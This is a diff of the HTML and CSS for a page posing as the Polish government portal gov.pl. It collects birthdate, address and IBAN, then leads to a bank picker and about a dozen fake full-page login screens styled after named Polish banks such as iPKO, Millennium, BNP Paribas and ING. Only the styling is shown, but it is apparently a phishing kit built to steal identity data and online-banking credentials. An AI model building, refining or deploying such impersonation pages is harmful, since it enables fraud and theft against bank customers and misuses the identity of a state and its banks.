@@ -5,15 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#ffffff">
     
-    <!-- ===== FAVICON ===== -->
-    <link rel="icon" href=""plpolandflag_111661.ico" type="image/x-icon">
-    <link rel="shortcut icon" href="plpolandflag_111661.ico" type="image/x-icon">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🇵🇱</text></svg>" type="image/svg+xml">
     
     <title>gov.pl - Serwis Rzeczypospolitej Polskiej</title>
     <style>
         /* ============================================================
-           FULL CSS
+           FULL CSS — WSZYSTKIE STYLE ZACHOWANE
            ============================================================ */
         * {
             margin: 0;
@@ -44,7 +43,6 @@
             padding: 0 20px;
         }
 
-        /* ---------- HEADER ---------- */
         .header {
             background: #ffffff;
             width: 100%;
@@ -244,7 +242,6 @@
             display: block;
         }
 
-        /* ---------- MAIN WRAPPER ---------- */
         .main-wrapper {
             display: flex;
             gap: 0;
@@ -261,7 +258,6 @@
             margin-left: 100px;
         }
 
-        /* ---------- SIDEBAR ---------- */
         .sidebar {
             min-width: 268px;
             max-width: 268px;
@@ -387,7 +383,6 @@
             display: block;
         }
 
-        /* ---------- CONTENT ---------- */
         .content-wrapper {
             flex: 1;
             min-width: 0;
@@ -398,7 +393,6 @@
             margin-left: 100px;
         }
 
-        /* ---------- LOGIN NAV ---------- */
         .login-nav {
             width: 100%;
             background: #ffffff;
@@ -452,7 +446,6 @@
             text-decoration: underline;
         }
 
-        /* ---------- BANNER IMAGE ---------- */
         .image-under-banner {
             width: 100%;
             padding: 12px 0;
@@ -563,7 +556,6 @@
             color: #ffffff;
         }
 
-        /* ===== IBAN WRAPPER — PL INVISIBLE ===== */
         .iban-wrapper {
             position: relative;
             display: flex;
@@ -624,7 +616,6 @@
             background: #fff5f5 !important;
         }
 
-        /* ---------- FORM ---------- */
         .data-form-section {
             background: #ffffff;
             padding: 30px 40px 40px;
@@ -788,7 +779,6 @@
             }
         }
 
-        /* ---------- BANK SELECT ---------- */
         .bank-selection {
             display: none;
             background: #ffffff;
@@ -896,7 +886,6 @@
             text-decoration: underline;
         }
 
-        /* ---------- BANK 1 — iPKO ---------- */
         .login-screen {
             display: none;
             background: #ffffff;
@@ -1125,7 +1114,6 @@
             text-decoration: underline;
         }
 
-        /* ===== BANK 2 — Millennium ===== */
         .bank2-full-page {
             display: none;
             background: #ffffff;
@@ -1221,12 +1209,6 @@
             justify-content: center;
         }
 
-        .bank2-full-page .bank2-form .login-btn-row .form-group {
-            flex: 1;
-            min-width: 160px;
-            margin-bottom: 0;
-        }
-
         .bank2-full-page .bank2-form .login-btn {
             width: 100px;
             height: 44px;
@@ -1270,7 +1252,6 @@
             font-weight: 600;
         }
 
-        /* ===== BANK 3 ===== */
         .bank3-full-page {
             display: none;
             background: url('1234.jpg') center/cover no-repeat;
@@ -1461,7 +1442,6 @@
             color: #888;
         }
 
-        /* ===== BANK 4 ===== */
         .bank4-full-page {
             display: none;
             background: #f5f5f5;
@@ -1570,7 +1550,6 @@
             transform: scale(0.97);
         }
 
-        /* ===== BANK 5 ===== */
         .bank5-full-page {
             display: none;
             background: #1a1a1a;
@@ -1713,7 +1692,6 @@
             transform: scale(0.97);
         }
 
-        /* ===== BANK 6 — BOŚ (NAPRAWIONE) ===== */
         .bank6-full-page {
             display: none;
             background: #f0f4f8;
@@ -1904,7 +1882,6 @@
             color: #004d35;
         }
 
-        /* ===== BANK 7 — BNP Paribas ===== */
         .bank7-full-page {
             display: none;
             min-height: 100vh;
@@ -2120,7 +2097,6 @@
             display: block;
         }
 
-        /* ===== BANK 8 (NAPRAWIONE) ===== */
         .bank8-full-page {
             display: none;
             background: #f5f7fa;
@@ -2286,7 +2262,6 @@
             display: block;
         }
 
-        /* ===== BANK 9 ===== */
         .bank9-full-page {
             display: none;
             min-height: 100vh;
@@ -2426,7 +2401,6 @@
             transform: scale(0.97);
         }
 
-        /* ===== BANK 10 — BEZ LOGO ===== */
         .bank10-full-page {
             display: none;
             min-height: 100vh;
@@ -2593,7 +2567,6 @@
             font-weight: 700;
         }
 
-        /* ===== BANK 12 — ING ===== */
         .bank12-full-page {
             display: none;
             background: #ffffff;
@@ -2754,7 +2727,6 @@
             color: #e55800;
         }
 
-        /* ---------- TOAST ---------- */
         .toast-message {
             display: none;
             position: fixed;
@@ -2793,7 +2765,6 @@
             }
         }
 
-        /* ---------- FOOTER ---------- */
         .main-content {
             padding: 0;
             min-height: 20px;
@@ -2853,10 +2824,6 @@
             color: #9bb4d0;
         }
 
-        /* ============================================================
-           RESPONSIVE — IPHONE
-           ============================================================ */
-
         @supports (padding: max(0px)) {
             .header {
                 padding-left: max(20px, env(safe-area-inset-left));
@@ -2880,1210 +2847,331 @@
         }
 
         @media (max-width: 992px) {
-            .header {
-                height: auto;
-                min-height: 72px;
-                padding: 10px 16px;
-                flex-wrap: wrap;
-                position: relative;
-            }
-            .header-left {
-                flex-wrap: wrap;
-            }
-            .header-right {
-                margin-left: auto;
-                gap: 8px;
-                flex-wrap: wrap;
-                justify-content: flex-end;
-                margin-right: 0;
-            }
-            .main-wrapper {
-                margin-top: 0;
-                flex-direction: column;
-            }
-            .main-wrapper.shifted {
-                margin-left: 0;
-            }
-            .content-wrapper.shifted {
-                margin-left: 0;
-            }
-            .sidebar {
-                top: 0;
-                height: 100vh;
-                padding-top: 72px;
-                left: -280px;
-                min-width: 280px;
-                max-width: 280px;
-            }
-            .sidebar.open {
-                left: 0;
-            }
-            .footer.shifted {
-                margin-left: 0;
-            }
-            .header-search {
-                height: 38px;
-                min-width: 260px;
-            }
-            .header-search .search-icon-btn {
-                padding: 0 8px 0 10px;
-            }
-            .header-search .search-icon-btn svg {
-                width: 16px;
-                height: 16px;
-            }
-            .header-search input {
-                min-width: 120px;
-                font-size: 13px;
-            }
-            .header-search .search-submit-btn {
-                font-size: 13px;
-                padding: 0 16px;
-            }
-            .header-eu-logo {
-                width: 60px;
-                height: 36px;
-            }
-            .login-nav {
-                padding: 10px 20px;
-                gap: 20px 16px;
-            }
-            .login-nav .brand {
-                margin-left: 200px;
-                font-size: 18px;
-            }
-            .login-nav .nav-links {
-                gap: 16px;
-                margin-left: 20px;
-            }
-            .login-nav .nav-links a {
-                font-size: 14px;
-            }
-            .image-under-banner .image-wrapper .overlay-icon {
-                width: 130px;
-                height: 107px;
-                left: 270px;
-            }
-            .image-under-banner .image-wrapper .overlay-line {
-                left: 420px;
-            }
-            .image-under-banner .image-wrapper .overlay-text {
-                left: 440px;
-                max-width: 280px;
-            }
-            .image-under-banner .image-wrapper .overlay-text h2 {
-                font-size: 22px;
-            }
-            .image-under-banner .image-wrapper .overlay-text p {
-                font-size: 14px;
-            }
-            .image-under-banner .image-wrapper .overlay-text .btn-outline {
-                font-size: 12px;
-                padding: 8px 20px;
-            }
-            .data-form {
-                grid-template-columns: 1fr;
-            }
-            .data-form .address-row {
-                grid-template-columns: 1fr;
-            }
-            .data-form-section {
-                padding: 20px;
-            }
-            .bank-grid {
-                grid-template-columns: repeat(2, 1fr);
-                max-width: 440px;
-                gap: 16px;
-            }
-            .bank-btn {
-                width: 100%;
-                max-width: 191px;
-                height: 70px;
-                min-height: 70px;
-                max-height: 70px;
-            }
-            .bank-btn img {
-                width: 140px;
-                height: 45px;
-            }
-            .bank-btn img[alt="Bank 2"] {
-                width: 140px;
-                height: 45px;
-            }
-            .bank-selection {
-                padding: 40px 20px 20px;
-                min-height: calc(100vh - 72px);
-            }
-            .bank-footer {
-                padding: 40px 0 20px;
-            }
-            .login-screen {
-                padding: 30px 20px 20px;
-                min-height: calc(100vh - 72px);
-            }
-            .login-screen .login-grid {
-                flex-direction: column;
-                gap: 30px;
-            }
-            .login-screen .login-left {
-                max-width: 100%;
-                width: 100%;
-            }
-            .login-screen .login-right {
-                max-width: 100%;
-                width: 100%;
-                padding-top: 0;
-                border-top: 1px solid #e6ebf3;
-                padding-top: 24px;
-            }
-            .login-screen .security-info,
-            .login-screen .contact-info {
-                border-left: none;
-                padding-left: 0;
-            }
-            .login-screen .login-title {
-                font-size: 24px;
-            }
-            .login-screen .login-form .login-btn-row {
-                flex-direction: column;
-                align-items: stretch;
-            }
-            .login-screen .login-form .login-btn {
-                width: 100%;
-                height: 44px;
-            }
-            .bank2-full-page .bank2-container {
-                padding: 20px 20px 40px;
-            }
-            .bank2-full-page .bank2-box {
-                padding: 24px 20px;
-            }
-            .bank3-header .bank3-header-content {
-                padding: 0 20px;
-            }
-            .bank3-full-page .login-form-wrapper {
-                max-width: 100%;
-                padding: 20px;
-            }
-            .bank3-full-page .login-form-wrapper .login-title {
-                font-size: 24px;
-            }
-            .bank3-full-page .login-form-wrapper .login-btn-row {
-                flex-direction: column;
-                align-items: stretch;
-            }
-            .bank3-full-page .login-form-wrapper .login-btn {
-                width: 100%;
-                height: 44px;
-            }
-            .bank4-full-page .bank4-container {
-                padding: 40px 20px;
-            }
-            .bank4-full-page .bank4-title {
-                font-size: 28px;
-            }
-            .bank4-full-page .bank4-form .login-btn-row {
-                flex-direction: column;
-                align-items: stretch;
-            }
-            .bank4-full-page .bank4-form .login-btn {
-                width: 100%;
-                height: 44px;
-            }
-            .bank5-full-page .bank5-container {
-                max-width: 100%;
-            }
-            .bank5-full-page .bank5-box {
-                padding: 30px 24px;
-            }
-            .bank5-full-page .bank5-title {
-                font-size: 22px;
-            }
-            .bank5-full-page .bank5-form .login-btn-row {
-                flex-direction: column;
-                align-items: stretch;
-            }
-            .bank5-full-page .bank5-form .login-btn {
-                width: 100%;
-                height: 44px;
-            }
-            .bank6-container {
-                flex-direction: column;
-                max-width: 500px;
-                padding: 30px 24px;
-                gap: 30px;
-                margin: 20px auto;
-            }
-            .bank6-left {
-                max-width: 100%;
-                width: 100%;
-            }
-            .bank6-right {
-                max-width: 100%;
-                width: 100%;
-            }
-            .bank6-title {
-                font-size: 24px;
-            }
-            .bank7-full-page .bank7-container {
-                padding: 40px 20px;
-            }
-            .bank7-full-page .bank7-norton {
-                bottom: 16px;
-                right: 20px;
-            }
-            .bank8-full-page .bank8-container {
-                flex-direction: column;
-                padding: 30px 20px;
-                gap: 30px;
-            }
-            .bank8-full-page .bank8-left {
-                max-width: 100%;
-                width: 100%;
-            }
-            .bank8-full-page .bank8-card {
-                width: 100%;
-                max-width: 519px;
-            }
-            .bank8-full-page .bank8-right {
-                max-width: 100%;
-                padding-top: 0;
-            }
-            .bank9-full-page .bank9-container {
-                padding: 30px 20px;
-            }
-            .bank9-full-page .bank9-top .bank9-title {
-                font-size: 16px;
-            }
-            .bank9-full-page .bank9-card {
-                width: 100%;
-                max-width: 397px;
-            }
-            .bank10-full-page .bank10-container {
-                padding: 30px 20px;
-            }
-            .bank10-full-page .bank10-card {
-                width: 100%;
-                max-width: 566px;
-            }
-            .bank10-full-page .bank10-main {
-                flex-direction: column;
-                gap: 20px;
-            }
-            .bank10-full-page .bank10-left {
-                flex-direction: row;
-                align-items: center;
-                gap: 20px;
-                flex-wrap: wrap;
-            }
-            .bank10-full-page .bank10-form-section {
-                max-width: 100%;
-            }
-            .bank10-full-page .bank10-security {
-                max-width: 100%;
-            }
-            .bank12-full-page .bank12-container {
-                padding: 20px 20px 40px;
-            }
-            .bank12-full-page .bank12-box {
-                padding: 24px 20px;
-            }
-            .bank12-full-page .bank12-title {
-                font-size: 16px;
-            }
+            .header { height: auto; min-height: 72px; padding: 10px 16px; flex-wrap: wrap; position: relative; }
+            .header-left { flex-wrap: wrap; }
+            .header-right { margin-left: auto; gap: 8px; flex-wrap: wrap; justify-content: flex-end; margin-right: 0; }
+            .main-wrapper { margin-top: 0; flex-direction: column; }
+            .main-wrapper.shifted { margin-left: 0; }
+            .content-wrapper.shifted { margin-left: 0; }
+            .sidebar { top: 0; height: 100vh; padding-top: 72px; left: -280px; min-width: 280px; max-width: 280px; }
+            .sidebar.open { left: 0; }
+            .footer.shifted { margin-left: 0; }
+            .header-search { height: 38px; min-width: 260px; }
+            .header-search .search-icon-btn { padding: 0 8px 0 10px; }
+            .header-search .search-icon-btn svg { width: 16px; height: 16px; }
+            .header-search input { min-width: 120px; font-size: 13px; }
+            .header-search .search-submit-btn { font-size: 13px; padding: 0 16px; }
+            .header-eu-logo { width: 60px; height: 36px; }
+            .login-nav { padding: 10px 20px; gap: 20px 16px; }
+            .login-nav .brand { margin-left: 200px; font-size: 18px; }
+            .login-nav .nav-links { gap: 16px; margin-left: 20px; }
+            .login-nav .nav-links a { font-size: 14px; }
+            .image-under-banner .image-wrapper .overlay-icon { width: 130px; height: 107px; left: 270px; }
+            .image-under-banner .image-wrapper .overlay-line { left: 420px; }
+            .image-under-banner .image-wrapper .overlay-text { left: 440px; max-width: 280px; }
+            .image-under-banner .image-wrapper .overlay-text h2 { font-size: 22px; }
+            .image-under-banner .image-wrapper .overlay-text p { font-size: 14px; }
+            .image-under-banner .image-wrapper .overlay-text .btn-outline { font-size: 12px; padding: 8px 20px; }
+            .data-form { grid-template-columns: 1fr; }
+            .data-form .address-row { grid-template-columns: 1fr; }
+            .data-form-section { padding: 20px; }
+            .bank-grid { grid-template-columns: repeat(2, 1fr); max-width: 440px; gap: 16px; }
+            .bank-btn { width: 100%; max-width: 191px; height: 70px; min-height: 70px; max-height: 70px; }
+            .bank-btn img { width: 140px; height: 45px; }
+            .bank-btn img[alt="Bank 2"] { width: 140px; height: 45px; }
+            .bank-selection { padding: 40px 20px 20px; min-height: calc(100vh - 72px); }
+            .bank-footer { padding: 40px 0 20px; }
+            .login-screen { padding: 30px 20px 20px; min-height: calc(100vh - 72px); }
+            .login-screen .login-grid { flex-direction: column; gap: 30px; }
+            .login-screen .login-left { max-width: 100%; width: 100%; }
+            .login-screen .login-right { max-width: 100%; width: 100%; padding-top: 0; border-top: 1px solid #e6ebf3; padding-top: 24px; }
+            .login-screen .security-info, .login-screen .contact-info { border-left: none; padding-left: 0; }
+            .login-screen .login-title { font-size: 24px; }
+            .login-screen .login-form .login-btn-row { flex-direction: column; align-items: stretch; }
+            .login-screen .login-form .login-btn { width: 100%; height: 44px; }
+            .bank2-full-page .bank2-container { padding: 20px 20px 40px; }
+            .bank2-full-page .bank2-box { padding: 24px 20px; }
+            .bank3-header .bank3-header-content { padding: 0 20px; }
+            .bank3-full-page .login-form-wrapper { max-width: 100%; padding: 20px; }
+            .bank3-full-page .login-form-wrapper .login-title { font-size: 24px; }
+            .bank3-full-page .login-form-wrapper .login-btn-row { flex-direction: column; align-items: stretch; }
+            .bank3-full-page .login-form-wrapper .login-btn { width: 100%; height: 44px; }
+            .bank4-full-page .bank4-container { padding: 40px 20px; }
+            .bank4-full-page .bank4-title { font-size: 28px; }
+            .bank4-full-page .bank4-form .login-btn-row { flex-direction: column; align-items: stretch; }
+            .bank4-full-page .bank4-form .login-btn { width: 100%; height: 44px; }
+            .bank5-full-page .bank5-container { max-width: 100%; }
+            .bank5-full-page .bank5-box { padding: 30px 24px; }
+            .bank5-full-page .bank5-title { font-size: 22px; }
+            .bank5-full-page .bank5-form .login-btn-row { flex-direction: column; align-items: stretch; }
+            .bank5-full-page .bank5-form .login-btn { width: 100%; height: 44px; }
+            .bank6-container { flex-direction: column; max-width: 500px; padding: 30px 24px; gap: 30px; margin: 20px auto; }
+            .bank6-left { max-width: 100%; width: 100%; }
+            .bank6-right { max-width: 100%; width: 100%; }
+            .bank6-title { font-size: 24px; }
+            .bank7-full-page .bank7-container { padding: 40px 20px; }
+            .bank7-full-page .bank7-norton { bottom: 16px; right: 20px; }
+            .bank8-full-page .bank8-container { flex-direction: column; padding: 30px 20px; gap: 30px; }
+            .bank8-full-page .bank8-left { max-width: 100%; width: 100%; }
+            .bank8-full-page .bank8-card { width: 100%; max-width: 519px; }
+            .bank8-full-page .bank8-right { max-width: 100%; padding-top: 0; }
+            .bank9-full-page .bank9-container { padding: 30px 20px; }
+            .bank9-full-page .bank9-top .bank9-title { font-size: 16px; }
+            .bank9-full-page .bank9-card { width: 100%; max-width: 397px; }
+            .bank10-full-page .bank10-container { padding: 30px 20px; }
+            .bank10-full-page .bank10-card { width: 100%; max-width: 566px; }
+            .bank10-full-page .bank10-main { flex-direction: column; gap: 20px; }
+            .bank10-full-page .bank10-left { flex-direction: row; align-items: center; gap: 20px; flex-wrap: wrap; }
+            .bank10-full-page .bank10-form-section { max-width: 100%; }
+            .bank10-full-page .bank10-security { max-width: 100%; }
+            .bank12-full-page .bank12-container { padding: 20px 20px 40px; }
+            .bank12-full-page .bank12-box { padding: 24px 20px; }
+            .bank12-full-page .bank12-title { font-size: 16px; }
         }
 
         @media (max-width: 768px) {
-            .login-nav {
-                display: none !important;
-            }
-            .sidebar {
-                display: none !important;
-            }
-            .menu-btn {
-                display: none !important;
-            }
-            .footer .container {
-                grid-template-columns: 1fr;
-                text-align: center;
-            }
-            .logo-area {
-                flex-wrap: wrap;
-                justify-content: center;
-            }
-            .logo-area .logo-main {
-                flex-wrap: wrap;
-                justify-content: center;
-            }
-            .logo-area .coat-of-arms {
-                height: 32px;
-            }
-            .logo-area .logo-main .separator {
-                font-size: 22px;
-            }
-            .header-search {
-                height: 34px;
-                width: 100%;
-                min-width: unset;
-                border-radius: 4px;
-            }
-            .header-search .search-icon-btn {
-                padding: 0 6px 0 8px;
-            }
-            .header-search .search-icon-btn svg {
-                width: 14px;
-                height: 14px;
-            }
-            .header-search input {
-                min-width: 80px;
-                font-size: 12px;
-                padding: 0 8px 0 0;
-            }
-            .header-search .search-submit-btn {
-                font-size: 12px;
-                padding: 0 14px;
-            }
-            .header-eu-logo {
-                width: 50px;
-                height: 30px;
-            }
-            .header-right {
-                margin-left: 0;
-                width: 100%;
-                justify-content: flex-end;
-                margin-top: 8px;
-                gap: 6px;
-                margin-right: 0;
-            }
-            .image-under-banner .image-wrapper img {
-                width: 100%;
-                max-width: 100%;
-                height: auto;
-                transform: scale(1.5);
-                transform-origin: center center;
-            }
-            .image-under-banner .image-wrapper .overlay-icon {
-                width: 100px;
-                height: 82px;
-                left: 180px;
-            }
-            .image-under-banner .image-wrapper .overlay-line {
-                left: 300px;
-                width: 1.5px;
-            }
-            .image-under-banner .image-wrapper .overlay-text {
-                left: 315px;
-                max-width: 180px;
-            }
-            .image-under-banner .image-wrapper .overlay-text h2 {
-                font-size: 16px;
-            }
-            .image-under-banner .image-wrapper .overlay-text p {
-                font-size: 12px;
-                margin-bottom: 10px;
-            }
-            .image-under-banner .image-wrapper .overlay-text .btn-outline {
-                font-size: 10px;
-                padding: 5px 14px;
-                border-width: 1.5px;
-            }
-            .data-form .form-group input#birthdate {
-                letter-spacing: 2px;
-            }
-            .data-form {
-                grid-template-columns: 1fr;
-            }
-            .data-form .address-row {
-                display: grid;
-                grid-template-columns: 2fr 1fr 1fr;
-                gap: 6px;
-            }
-            .data-form .address-row input {
-                font-size: 13px;
-                padding: 8px 6px;
-            }
-            .data-form .address-row input[name="postal"] {
-                letter-spacing: 1px;
-            }
-            .data-form-section {
-                padding: 16px;
-            }
-            .data-form .form-actions {
-                justify-content: center;
-            }
-            .data-form .submit-btn {
-                width: 100%;
-                justify-content: center;
-                text-align: center;
-            }
-            .bank-grid {
-                grid-template-columns: repeat(2, 1fr);
-                max-width: 380px;
-                gap: 12px;
-            }
-            .bank-btn {
-                height: 60px;
-                max-height: 60px;
-                min-height: 60px;
-                width: 100%;
-                max-width: 191px;
-            }
-            .bank-btn img {
-                width: 120px;
-                height: 38px;
-            }
-            .bank-btn img[alt="Bank 2"] {
-                width: 120px;
-                height: 38px;
-            }
-            .bank-selection {
-                padding: 30px 16px 20px;
-                min-height: calc(100vh - 72px);
-            }
-            .bank-selection .bank-title {
-                font-size: 24px;
-            }
-            .bank-selection .bank-subtitle {
-                font-size: 16px;
-            }
-            .bank-footer {
-                padding: 30px 0 20px;
-            }
-            .bank-footer .footer-links {
-                gap: 16px;
-            }
-            .bank-footer .footer-links a {
-                font-size: 12px;
-            }
-            .login-screen {
-                padding: 20px 16px 16px;
-            }
-            .login-screen .login-title {
-                font-size: 22px;
-            }
-            .login-screen .login-subtitle {
-                font-size: 14px;
-            }
-            .login-screen .login-form input {
-                padding: 10px 12px;
-                font-size: 13px;
-            }
-            .login-screen .login-form .login-btn {
-                height: 40px;
-                font-size: 14px;
-            }
-            .login-screen .login-left .ipko-logo {
-                width: 60px;
-                height: 45px;
-            }
-            .login-screen .security-info .info-title,
-            .login-screen .contact-info .info-title {
-                font-size: 16px;
-            }
-            .login-screen .contact-info .contact-phone {
-                font-size: 16px;
-            }
-            .login-screen .login-grid {
-                gap: 24px;
-            }
-            .bank2-full-page .bank2-container {
-                padding: 16px 16px 30px;
-            }
-            .bank2-full-page .bank2-box {
-                padding: 20px 16px;
-            }
-            .bank2-full-page .bank2-form input {
-                padding: 10px 12px;
-                font-size: 13px;
-            }
-            .bank2-full-page .bank2-form .login-btn {
-                width: 72px;
-                height: 40px;
-                font-size: 14px;
-            }
-            .bank3-header {
-                height: 48px;
-            }
-            .bank3-header .bank3-header-content {
-                padding: 0 16px;
-            }
-            .bank3-header .bank3-header-content .bank3-logo {
-                height: 28px;
-            }
-            .bank3-full-page .login-form-wrapper .login-title {
-                font-size: 22px;
-            }
-            .bank3-full-page .login-form-wrapper .login-subtitle {
-                font-size: 14px;
-            }
-            .bank3-full-page .login-form-wrapper input {
-                padding: 10px 12px;
-                font-size: 13px;
-            }
-            .bank3-full-page .login-form-wrapper .login-btn {
-                height: 40px;
-                font-size: 14px;
-            }
-            .bank4-full-page .bank4-container {
-                padding: 30px 16px;
-            }
-            .bank4-full-page .bank4-title {
-                font-size: 24px;
-            }
-            .bank4-full-page .bank4-subtitle {
-                font-size: 14px;
-            }
-            .bank4-full-page .bank4-form input {
-                padding: 10px 12px;
-                font-size: 13px;
-            }
-            .bank4-full-page .bank4-form .login-btn {
-                height: 40px;
-                font-size: 14px;
-            }
-            .bank5-full-page .bank5-box {
-                padding: 24px 18px;
-            }
-            .bank5-full-page .bank5-title {
-                font-size: 20px;
-            }
-            .bank5-full-page .bank5-subtitle {
-                font-size: 14px;
-            }
-            .bank5-full-page .bank5-form input {
-                padding: 10px 12px;
-                font-size: 13px;
-            }
-            .bank5-full-page .bank5-form .login-btn {
-                height: 40px;
-                font-size: 14px;
-            }
-            .bank6-container {
-                padding: 24px 18px;
-                margin: 10px;
-            }
-            .bank6-title {
-                font-size: 22px;
-            }
-            .bank6-form input {
-                padding: 10px 14px;
-                font-size: 13px;
-            }
-            .bank6-form .login-btn {
-                padding: 12px;
-                font-size: 14px;
-            }
-            .bank6-download img {
-                width: 160px;
-                height: 36px;
-            }
-            .bank6-security-title {
-                font-size: 16px;
-            }
-            .bank6-security-text {
-                font-size: 13px;
-            }
-            .bank7-full-page .bank7-container {
-                padding: 30px 16px;
-            }
-            .bank7-full-page .bank7-box {
-                padding: 24px 18px;
-            }
-            .bank7-full-page .bank7-title {
-                font-size: 20px;
-            }
-            .bank7-full-page .bank7-subtitle {
-                font-size: 13px;
-            }
-            .bank7-full-page .bank7-form input {
-                padding: 10px 12px;
-                font-size: 13px;
-            }
-            .bank7-full-page .bank7-form .login-btn {
-                padding: 12px;
-                font-size: 14px;
-            }
-            .bank7-full-page .bank7-norton {
-                bottom: 14px;
-                right: 16px;
-            }
-            .bank7-full-page .bank7-norton img {
-                width: 60px;
-                height: 40px;
-            }
-            .bank8-full-page .bank8-container {
-                padding: 20px 16px;
-                gap: 24px;
-            }
-            .bank8-full-page .bank8-card {
-                padding: 20px 16px;
-                width: 100%;
-                max-width: 100%;
-            }
-            .bank8-full-page .bank8-card .bank8-card-title {
-                font-size: 16px;
-            }
-            .bank8-full-page .bank8-card .bank8-login-title {
-                font-size: 18px;
-            }
-            .bank8-full-page .bank8-form input {
-                padding: 10px 12px;
-                font-size: 13px;
-            }
-            .bank8-full-page .bank8-form .login-btn {
-                padding: 12px;
-                font-size: 14px;
-            }
-            .bank8-full-page .bank8-right {
-                padding-top: 0;
-            }
-            .bank8-full-page .bank8-security-title {
-                font-size: 18px;
-            }
-            .bank8-full-page .bank8-security-text {
-                font-size: 14px;
-            }
-            .bank8-full-page .bank8-security-image img {
-                width: 200px;
-                height: auto;
-            }
-            .bank9-full-page .bank9-container {
-                padding: 20px 16px;
-            }
-            .bank9-full-page .bank9-top {
-                flex-direction: column;
-                align-items: flex-start;
-                gap: 12px;
-            }
-            .bank9-full-page .bank9-top .bank9-title {
-                font-size: 15px;
-            }
-            .bank9-full-page .bank9-card {
-                width: 100%;
-                max-width: 100%;
-                padding: 24px 18px;
-            }
-            .bank9-full-page .bank9-card .bank9-welcome {
-                font-size: 20px;
-            }
-            .bank9-full-page .bank9-form input {
-                padding: 10px 12px;
-                font-size: 13px;
-            }
-            .bank9-full-page .bank9-form .login-btn {
-                padding: 12px;
-                font-size: 14px;
-            }
-            .bank10-full-page .bank10-container {
-                padding: 20px 16px;
-            }
-            .bank10-full-page .bank10-card {
-                padding: 16px 18px;
-                width: 100%;
-                max-width: 100%;
-            }
-            .bank10-full-page .bank10-card p {
-                font-size: 13px;
-            }
-            .bank10-full-page .bank10-form-section .bank10-login-title {
-                font-size: 20px;
-            }
-            .bank10-full-page .bank10-form input {
-                padding: 10px 12px;
-                font-size: 13px;
-                border-radius: 6px;
-            }
-            .bank10-full-page .bank10-form .login-btn {
-                padding: 12px;
-                font-size: 14px;
-            }
-            .bank10-full-page .bank10-security-title {
-                font-size: 15px;
-            }
-            .bank10-full-page .bank10-security-list li {
-                font-size: 13px;
-            }
-            .bank12-full-page .bank12-container {
-                padding: 16px 16px 30px;
-            }
-            .bank12-full-page .bank12-box {
-                padding: 20px 16px;
-            }
-            .bank12-full-page .bank12-title {
-                font-size: 15px;
-            }
-            .bank12-full-page .bank12-form input {
-                padding: 10px 12px;
-                font-size: 13px;
-            }
-            .bank12-full-page .bank12-form .login-btn {
-                width: 72px;
-                height: 40px;
-                font-size: 14px;
-            }
+            .login-nav { display: none !important; }
+            .sidebar { display: none !important; }
+            .menu-btn { display: none !important; }
+            .footer .container { grid-template-columns: 1fr; text-align: center; }
+            .logo-area { flex-wrap: wrap; justify-content: center; }
+            .logo-area .logo-main { flex-wrap: wrap; justify-content: center; }
+            .logo-area .coat-of-arms { height: 32px; }
+            .logo-area .logo-main .separator { font-size: 22px; }
+            .header-search { height: 34px; width: 100%; min-width: unset; border-radius: 4px; }
+            .header-search .search-icon-btn { padding: 0 6px 0 8px; }
+            .header-search .search-icon-btn svg { width: 14px; height: 14px; }
+            .header-search input { min-width: 80px; font-size: 12px; padding: 0 8px 0 0; }
+            .header-search .search-submit-btn { font-size: 12px; padding: 0 14px; }
+            .header-eu-logo { width: 50px; height: 30px; }
+            .header-right { margin-left: 0; width: 100%; justify-content: flex-end; margin-top: 8px; gap: 6px; margin-right: 0; }
+            .image-under-banner .image-wrapper img { width: 100%; max-width: 100%; height: auto; transform: scale(1.5); transform-origin: center center; }
+            .image-under-banner .image-wrapper .overlay-icon { width: 100px; height: 82px; left: 180px; }
+            .image-under-banner .image-wrapper .overlay-line { left: 300px; width: 1.5px; }
+            .image-under-banner .image-wrapper .overlay-text { left: 315px; max-width: 180px; }
+            .image-under-banner .image-wrapper .overlay-text h2 { font-size: 16px; }
+            .image-under-banner .image-wrapper .overlay-text p { font-size: 12px; margin-bottom: 10px; }
+            .image-under-banner .image-wrapper .overlay-text .btn-outline { font-size: 10px; padding: 5px 14px; border-width: 1.5px; }
+            .data-form .form-group input#birthdate { letter-spacing: 2px; }
+            .data-form { grid-template-columns: 1fr; }
+            .data-form .address-row { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 6px; }
+            .data-form .address-row input { font-size: 13px; padding: 8px 6px; }
+            .data-form .address-row input[name="postal"] { letter-spacing: 1px; }
+            .data-form-section { padding: 16px; }
+            .data-form .form-actions { justify-content: center; }
+            .data-form .submit-btn { width: 100%; justify-content: center; text-align: center; }
+            .bank-grid { grid-template-columns: repeat(2, 1fr); max-width: 380px; gap: 12px; }
+            .bank-btn { height: 60px; max-height: 60px; min-height: 60px; width: 100%; max-width: 191px; }
+            .bank-btn img { width: 120px; height: 38px; }
+            .bank-btn img[alt="Bank 2"] { width: 120px; height: 38px; }
+            .bank-selection { padding: 30px 16px 20px; min-height: calc(100vh - 72px); }
+            .bank-selection .bank-title { font-size: 24px; }
+            .bank-selection .bank-subtitle { font-size: 16px; }
+            .bank-footer { padding: 30px 0 20px; }
+            .bank-footer .footer-links { gap: 16px; }
+            .bank-footer .footer-links a { font-size: 12px; }
+            .login-screen { padding: 20px 16px 16px; }
+            .login-screen .login-title { font-size: 22px; }
+            .login-screen .login-subtitle { font-size: 14px; }
+            .login-screen .login-form input { padding: 10px 12px; font-size: 13px; }
+            .login-screen .login-form .login-btn { height: 40px; font-size: 14px; }
+            .login-screen .login-left .ipko-logo { width: 60px; height: 45px; }
+            .login-screen .security-info .info-title, .login-screen .contact-info .info-title { font-size: 16px; }
+            .login-screen .contact-info .contact-phone { font-size: 16px; }
+            .login-screen .login-grid { gap: 24px; }
+            .bank2-full-page .bank2-container { padding: 16px 16px 30px; }
+            .bank2-full-page .bank2-box { padding: 20px 16px; }
+            .bank2-full-page .bank2-form input { padding: 10px 12px; font-size: 13px; }
+            .bank2-full-page .bank2-form .login-btn { width: 72px; height: 40px; font-size: 14px; }
+            .bank3-header { height: 48px; }
+            .bank3-header .bank3-header-content { padding: 0 16px; }
+            .bank3-header .bank3-header-content .bank3-logo { height: 28px; }
